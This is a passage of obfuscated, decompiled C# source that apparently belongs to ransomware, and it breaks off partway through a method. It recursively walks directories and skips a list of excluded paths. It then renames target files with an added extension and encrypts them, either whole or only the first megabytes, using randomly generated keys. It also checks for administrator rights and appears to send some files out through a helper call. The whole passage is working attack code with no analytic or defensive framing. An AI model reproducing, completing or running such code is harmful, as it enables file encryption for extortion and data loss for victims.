using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using fzdQQTJNGHZKSm;

namespace KNpKkassJHAdE;

internal sealed class GvesiNnPBqLNWZ
{
	public sealed class onsfHMsUjR
	{
		private static StringCollection mfuvrHuBURzp;

		private static List<string> lVXkeoPjEdW;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107365875));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107365902)) && !text.ToLower().Contains(getString_0(107365849)) && !text.ToLower().Contains(getString_0(107352051)) && !text.ToLower().Contains(getString_0(107352070)) && !text.ToLower().Contains(getString_0(107365868)) && !text.ToLower().Contains(getString_0(107351378)) && !text.ToLower().Contains(getString_0(107351319)) && !text.ToLower().Contains(getString_0(107351334)) && !text.ToLower().Contains(getString_0(107351285)) && !text.ToLower().Contains(getString_0(107351300)) && !text.ToLower().Contains(getString_0(107351266)) && !text.ToLower().Contains(getString_0(107351217)) && !text.ToLower().Contains(getString_0(107351232)) && !text.ToLower().Contains(getString_0(107351187)) && !text.ToLower().Contains(getString_0(107351166)) && !text.ToLower().Contains(getString_0(107351153)) && !text.ToLower().Contains(getString_0(107351172)) && !text.ToLower().Contains(getString_0(107351635)) && !text.ToLower().Contains(getString_0(107351650)) && !text.Contains(PezUDwzFibxi(getString_0(107351601))) && !text.Contains(getString_0(107351576)) && !text.Contains(getString_0(107351546)) && !text.EndsWith(getString_0(107395707)) && !text.EndsWith(getString_0(107351553)) && !text.EndsWith(getString_0(107351516)) && !text.EndsWith(getString_0(107351511)) && !text.EndsWith(getString_0(107351506)) && !text.ToLower().Contains(getString_0(107351533)) && !text.ToLower().Contains(TtSJHFNNcPb))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ixIGGardILHOj) * 1024.0 * 1024.0 && HXlLaIOCjltyI == getString_0(107396905))
							{
								lVXkeoPjEdW.Add(text);
							}
							else if (File.Exists(text) && HXlLaIOCjltyI == getString_0(107396758))
							{
								lVXkeoPjEdW.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return lVXkeoPjEdW;
		}

		static onsfHMsUjR()
		{
			Strings.CreateGetStringDelegate(typeof(onsfHMsUjR));
			mfuvrHuBURzp = new StringCollection();
			lVXkeoPjEdW = new List<string>();
		}
	}

	private sealed class ntZBwGacGnI
	{
		public string fHevaDWKMh;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == fHevaDWKMh;
		}
	}

	private sealed class iXMODReroLTt
	{
		private sealed class jldPxebaCTEV
		{
			public iXMODReroLTt oATFKerpLrEKAmG;

			public string OthvQpDMJub;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					VNZgLvaqfsBHa(WindowsIdentity.GetCurrent().Name, OthvQpDMJub);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				crZXGfdxyHFE(OthvQpDMJub, oATFKerpLrEKAmG.LnRuiadQwPaOYO, oATFKerpLrEKAmG.ntUFwYVnXwnvX, oATFKerpLrEKAmG.YILhnTBijaRm, oATFKerpLrEKAmG.HJQwyKJdDkzhs);
			}
		}

		public string[] LnRuiadQwPaOYO;

		public string[] YILhnTBijaRm;

		public string HJQwyKJdDkzhs;

		public string ntUFwYVnXwnvX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			jldPxebaCTEV CS_0024_003C_003E8__locals0 = new jldPxebaCTEV();
			CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG = this;
			CS_0024_003C_003E8__locals0.OthvQpDMJub = string_0;
			if (KiWrkOzwNeQ && !VtxukLeuoIqnc().Contains(getString_0(107349227)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						VNZgLvaqfsBHa(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.OthvQpDMJub);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (PEsWJvkMybol == getString_0(107396911))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					crZXGfdxyHFE(CS_0024_003C_003E8__locals0.OthvQpDMJub, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.LnRuiadQwPaOYO, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.ntUFwYVnXwnvX, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.YILhnTBijaRm, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.HJQwyKJdDkzhs);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				crZXGfdxyHFE(CS_0024_003C_003E8__locals0.OthvQpDMJub, LnRuiadQwPaOYO, ntUFwYVnXwnvX, YILhnTBijaRm, HJQwyKJdDkzhs);
			}
		}

		static iXMODReroLTt()
		{
			Strings.CreateGetStringDelegate(typeof(iXMODReroLTt));
		}
	}

	private sealed class zCsmcvfctIQqb
	{
		private sealed class ovqvOoOTXHbosC
		{
			public zCsmcvfctIQqb MPyxrgXdswzEa;

			public string mCkadvSFOV;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in GudmyYRjNKBi)
				{
					if (mCkadvSFOV.ToLower().EndsWith(item + MPyxrgXdswzEa.ENjMrAcnRYQPq) && mIyxJtJKMNcFYRO == getString_0(107396922))
					{
						if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > new FileInfo(mCkadvSFOV).Length)
						{
							try
							{
								KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352243), getString_0(107352206), getString_0(107352193), mCkadvSFOV);
							}
							catch
							{
							}
						}
					}
					else if (mCkadvSFOV.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396775))
					{
						try
						{
							KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352243), getString_0(107352206), getString_0(107352193), mCkadvSFOV);
						}
						catch
						{
						}
					}
				}
			}

			static ovqvOoOTXHbosC()
			{
				Strings.CreateGetStringDelegate(typeof(ovqvOoOTXHbosC));
			}
		}

		private sealed class JvVYRRIESgJ
		{
			public zCsmcvfctIQqb MPyxrgXdswzEa;

			public string KEBRpwBiCXLkfn;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in GudmyYRjNKBi)
				{
					if (KEBRpwBiCXLkfn.ToLower().EndsWith(item + MPyxrgXdswzEa.ENjMrAcnRYQPq) && mIyxJtJKMNcFYRO == getString_0(107396925))
					{
						if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > new FileInfo(KEBRpwBiCXLkfn).Length)
						{
							try
							{
								KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352246), getString_0(107352209), getString_0(107352196), KEBRpwBiCXLkfn);
							}
							catch
							{
							}
						}
					}
					else if (KEBRpwBiCXLkfn.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == getString_0(107396778))
					{
						try
						{
							KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352246), getString_0(107352209), getString_0(107352196), KEBRpwBiCXLkfn);
						}
						catch
						{
						}
					}
				}
			}

			static JvVYRRIESgJ()
			{
				Strings.CreateGetStringDelegate(typeof(JvVYRRIESgJ));
			}
		}

		public List<string> PhQutbeFDiwVNXL;

		public List<string> jFEDMGNYImhkubB;

		public string ENjMrAcnRYQPq;

		public string[] fWMKriILxpnJx;

		public string iQTIcymIJnskgc;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			ovqvOoOTXHbosC CS_0024_003C_003E8__locals0;
			foreach (string item in jFEDMGNYImhkubB)
			{
				if (fWMKriILxpnJx.Length != 0)
				{
					string[] array = fWMKriILxpnJx;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09e1;
					}
				}
				try
				{
					if (item.EndsWith(ENjMrAcnRYQPq))
					{
						goto IL_09e1;
					}
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				if (!item.EndsWith(string_0) || twsigDVIjwu.Contains(item))
				{
					continue;
				}
				if (ZvCBEZNGHm == getString_0(107396919))
				{
					try
					{
						if (TyZKNgMENwJFJ.XaMCZRYeWeP(item))
						{
							TyZKNgMENwJFJ.KajMhyCQYhazwSI(item);
						}
					}
					catch
					{
					}
				}
				twsigDVIjwu.Add(item);
				if (!kYHVChgvsRpLIPK.Contains(Path.GetDirectoryName(item)))
				{
					kYHVChgvsRpLIPK.Add(Path.GetDirectoryName(item));
				}
				InoKNxbMnPL(item);
				try
				{
					new qgJBARYOVEIp().GiGCbTRccdaXtRKR(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (AuaquqZBglw)
							{
								Console.WriteLine(getString_0(107365833) + item + getString_0(107365820) + new FileInfo(item).Length + getString_0(107365767));
								Console.WriteLine(getString_0(107365758));
							}
						}
						catch
						{
						}
						hdbKundeWzS(PezUDwzFibxi(getString_0(107365173)), getString_0(107351431) + item + getString_0(107351431) + PezUDwzFibxi(getString_0(107365148)) + getString_0(107351431) + Environment.UserName + getString_0(107351431) + PezUDwzFibxi(getString_0(107365099)));
					}
				}
				catch (Exception ex2)
				{
					if (xhPAPGRrPiLSI)
					{
						try
						{
							File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + item + getString_0(107365106) + ex2.Message + getString_0(107397114));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (xhPAPGRrPiLSI)
						{
							try
							{
								File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + item + getString_0(107364993) + ex4.Message + getString_0(107397114));
							}
							catch (Exception)
							{
							}
						}
						nejJdrwjWaKRmO++;
						goto end_IL_02cd;
					}
					if (vBKqMUxzeIsbM == getString_0(107396919) && new FileInfo(item).Length > Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024 && !PhQutbeFDiwVNXL.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new ovqvOoOTXHbosC();
						CS_0024_003C_003E8__locals0.MPyxrgXdswzEa = this;
						try
						{
							if (ENjMrAcnRYQPq != getString_0(107349625))
							{
								if (PAqNnRchDyH)
								{
									ENjMrAcnRYQPq = MjsEcDNWxGU + ENjMrAcnRYQPq;
								}
								File.Move(item, item + ENjMrAcnRYQPq);
							}
						}
						catch (Exception ex6)
						{
							if (xhPAPGRrPiLSI)
							{
								try
								{
									File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + item + getString_0(107365444) + ex6.Message + getString_0(107397114));
								}
								catch (Exception)
								{
								}
							}
							nejJdrwjWaKRmO++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.mCkadvSFOV = getString_0(107352639);
						if (ENjMrAcnRYQPq != getString_0(107349625))
						{
							CS_0024_003C_003E8__locals0.mCkadvSFOV = item + ENjMrAcnRYQPq;
						}
						else
						{
							CS_0024_003C_003E8__locals0.mCkadvSFOV = item;
						}
						if (GmyAlsJsED == getString_0(107396919))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in GudmyYRjNKBi)
								{
									if (CS_0024_003C_003E8__locals0.mCkadvSFOV.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.MPyxrgXdswzEa.ENjMrAcnRYQPq) && mIyxJtJKMNcFYRO == ovqvOoOTXHbosC.getString_0(107396922))
									{
										if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.mCkadvSFOV).Length)
										{
											try
											{
												KmMaNbsldEJY.uWayiSxqXzMe(ovqvOoOTXHbosC.getString_0(107352243), ovqvOoOTXHbosC.getString_0(107352206), ovqvOoOTXHbosC.getString_0(107352193), CS_0024_003C_003E8__locals0.mCkadvSFOV);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.mCkadvSFOV.ToLower().EndsWith(item2) && mIyxJtJKMNcFYRO == ovqvOoOTXHbosC.getString_0(107396775))
									{
										try
										{
											KmMaNbsldEJY.uWayiSxqXzMe(ovqvOoOTXHbosC.getString_0(107352243), ovqvOoOTXHbosC.getString_0(107352206), ovqvOoOTXHbosC.getString_0(107352193), CS_0024_003C_003E8__locals0.mCkadvSFOV);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
						string s = iAHfzSnUkutzj.JugqgFJafiYWrN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (cnqbTCccgr == getString_0(107396772))
						{
							byte[] array2 = null;
							byte[] byte_ = nCuLeFOJMwFm.SDNAkiJfsilGu(CS_0024_003C_003E8__locals0.mCkadvSFOV, Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024);
							if (nCuLeFOJMwFm.qPbWhlKhAppzNfg(iDrQCKghbyOmD: (!uXImrDqeGgUMuqj) ? (mAogUeKgKjciiQM ? nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mAogUeKgKjciiQM ? TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), pKaaTBGJXvm: CS_0024_003C_003E8__locals0.mCkadvSFOV, zLzjQSIBEPplj: bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ENjMrAcnRYQPq, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!mAogUeKgKjciiQM)
						{
							if (RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.mCkadvSFOV, yYEzOFFalxHtfd, iQTIcymIJnskgc))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ENjMrAcnRYQPq, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.mCkadvSFOV, yYEzOFFalxHtfd, text, bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ENjMrAcnRYQPq, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (PAqNnRchDyH)
					{
						ENjMrAcnRYQPq = MjsEcDNWxGU + ENjMrAcnRYQPq;
					}
					string text2 = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
					string s2 = iAHfzSnUkutzj.JugqgFJafiYWrN(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (ENjMrAcnRYQPq != getString_0(107349625))
					{
						if (!TpjoUwgOYzae)
						{
							if (!mAogUeKgKjciiQM)
							{
								tBEtVNBoVsVEH(item, item + ENjMrAcnRYQPq, GpMeZoreMAmJ);
							}
							else
							{
								tBEtVNBoVsVEH(item, item + ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!mAogUeKgKjciiQM)
								{
									UANUsGuULdAJojl(item, item + ENjMrAcnRYQPq, GpMeZoreMAmJ);
								}
								else
								{
									UANUsGuULdAJojl(item, item + ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (xhPAPGRrPiLSI)
								{
									try
									{
										File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + item + getString_0(107349579) + ex11.Message + getString_0(107397114));
									}
									catch (Exception)
									{
									}
								}
								nejJdrwjWaKRmO++;
								try
								{
									File.Move(item + ENjMrAcnRYQPq, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!TpjoUwgOYzae)
					{
						if (!mAogUeKgKjciiQM)
						{
							tBEtVNBoVsVEH(item, item + getString_0(107349620), GpMeZoreMAmJ);
						}
						else
						{
							tBEtVNBoVsVEH(item, item + getString_0(107349620), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!mAogUeKgKjciiQM)
							{
								UANUsGuULdAJojl(item, item, GpMeZoreMAmJ);
							}
							else
							{
								UANUsGuULdAJojl(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (xhPAPGRrPiLSI)
							{
								try
								{
									File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + item + getString_0(107349579) + ex14.Message + getString_0(107397114));
								}
								catch (Exception)
								{
								}
							}
							nejJdrwjWaKRmO++;
							goto end_IL_02cd;
						}
					}
					if (mAogUeKgKjciiQM)
					{
						if (ENjMrAcnRYQPq != getString_0(107349625))
						{
							LDYdJQzZKPd(item + ENjMrAcnRYQPq, bytes2);
						}
						else
						{
							LDYdJQzZKPd(item, bytes2);
						}
					}
					goto IL_09e1;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				continue;
				IL_09e1:
				jFEDMGNYImhkubB.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			JvVYRRIESgJ CS_0024_003C_003E8__locals0 = new JvVYRRIESgJ();
			CS_0024_003C_003E8__locals0.MPyxrgXdswzEa = this;
			CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn = string_0;
			if (fWMKriILxpnJx.Length != 0)
			{
				string[] array = fWMKriILxpnJx;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.EndsWith(ENjMrAcnRYQPq))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!twsigDVIjwu.Contains(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn))
			{
				if (ZvCBEZNGHm == getString_0(107396919))
				{
					try
					{
						if (TyZKNgMENwJFJ.XaMCZRYeWeP(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn))
						{
							TyZKNgMENwJFJ.KajMhyCQYhazwSI(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
						}
					}
					catch
					{
					}
				}
				twsigDVIjwu.Add(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
				if (!kYHVChgvsRpLIPK.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn)))
				{
					kYHVChgvsRpLIPK.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn));
				}
				InoKNxbMnPL(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
				try
				{
					new qgJBARYOVEIp().GiGCbTRccdaXtRKR(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (AuaquqZBglw)
							{
								Console.WriteLine(getString_0(107365833) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107365820) + new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length + getString_0(107365767));
								Console.WriteLine(getString_0(107365758));
							}
						}
						catch
						{
						}
						hdbKundeWzS(PezUDwzFibxi(getString_0(107365173)), getString_0(107351431) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107351431) + PezUDwzFibxi(getString_0(107365148)) + getString_0(107351431) + Environment.UserName + getString_0(107351431) + PezUDwzFibxi(getString_0(107365099)));
					}
				}
				catch (Exception ex2)
				{
					if (xhPAPGRrPiLSI)
					{
						try
						{
							File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107365106) + ex2.Message + getString_0(107397114));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (xhPAPGRrPiLSI)
						{
							try
							{
								File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107364993) + ex4.Message + getString_0(107397114));
							}
							catch (Exception)
							{
							}
						}
						nejJdrwjWaKRmO++;
						goto end_IL_031d_2;
					}
					if (vBKqMUxzeIsbM == getString_0(107396919) && new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length > Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024)
					{
						try
						{
							if (ENjMrAcnRYQPq != getString_0(107349625))
							{
								if (PAqNnRchDyH)
								{
									ENjMrAcnRYQPq = MjsEcDNWxGU + ENjMrAcnRYQPq;
								}
								File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq);
							}
						}
						catch (Exception ex6)
						{
							if (xhPAPGRrPiLSI)
							{
								try
								{
									File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107365444) + ex6.Message + getString_0(107397114));
								}
								catch (Exception)
								{
								}
							}
							nejJdrwjWaKRmO++;
							return;
						}
						if (ENjMrAcnRYQPq != getString_0(107349625))
						{
							CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn += ENjMrAcnRYQPq;
						}
						if (GmyAlsJsED == getString_0(107396919))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in GudmyYRjNKBi)
								{
									if (CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.MPyxrgXdswzEa.ENjMrAcnRYQPq) && mIyxJtJKMNcFYRO == JvVYRRIESgJ.getString_0(107396925))
									{
										if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn).Length)
										{
											try
											{
												KmMaNbsldEJY.uWayiSxqXzMe(JvVYRRIESgJ.getString_0(107352246), JvVYRRIESgJ.getString_0(107352209), JvVYRRIESgJ.getString_0(107352196), CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn.ToLower().EndsWith(item) && mIyxJtJKMNcFYRO == JvVYRRIESgJ.getString_0(107396778))
									{
										try
										{
											KmMaNbsldEJY.uWayiSxqXzMe(JvVYRRIESgJ.getString_0(107352246), JvVYRRIESgJ.getString_0(107352209), JvVYRRIESgJ.getString_0(107352196), CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
						string s = iAHfzSnUkutzj.JugqgFJafiYWrN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (cnqbTCccgr == getString_0(107396772))
						{
							byte[] array2 = null;
							byte[] byte_ = nCuLeFOJMwFm.SDNAkiJfsilGu(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024);
							if (!nCuLeFOJMwFm.qPbWhlKhAppzNfg(iDrQCKghbyOmD: (!uXImrDqeGgUMuqj) ? (mAogUeKgKjciiQM ? nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mAogUeKgKjciiQM ? TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(iQTIcymIJnskgc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), pKaaTBGJXvm: CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, zLzjQSIBEPplj: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!mAogUeKgKjciiQM)
						{
							if (!RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, yYEzOFFalxHtfd, iQTIcymIJnskgc))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!RhunxOCwPGyFq.cwGtynHLHHbFXx(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, yYEzOFFalxHtfd, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (PAqNnRchDyH)
						{
							ENjMrAcnRYQPq = MjsEcDNWxGU + ENjMrAcnRYQPq;
						}
						string text2 = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
						string s2 = iAHfzSnUkutzj.JugqgFJafiYWrN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (ENjMrAcnRYQPq != getString_0(107349625))
						{
							if (!TpjoUwgOYzae)
							{
								if (!mAogUeKgKjciiQM)
								{
									tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, GpMeZoreMAmJ);
								}
								else
								{
									tBEtVNBoVsVEH(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!mAogUeKgKjciiQM)
									{
										UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, GpMeZoreMAmJ);
									}
									else
									{
										UANUsGuULdAJojl(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (xhPAPGRrPiLSI)
									{
										try
										{
											File.AppendAllText(YnUuGHOKmtC, getString_0(107349369) + CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + getString_0(107349579) + ex11.Message + getString_0(107397114));
										}
										catch (Exception)
										{
										}
									}
									nejJdrwjWaKRmO++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn + ENjMrAcnRYQPq, CS_0024_003C_003E8__locals0.KEBRpwBiCXLkfn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!TpjoUwgOYzae)
						{
							if (!mAogUeKgKjciiQM)
							{
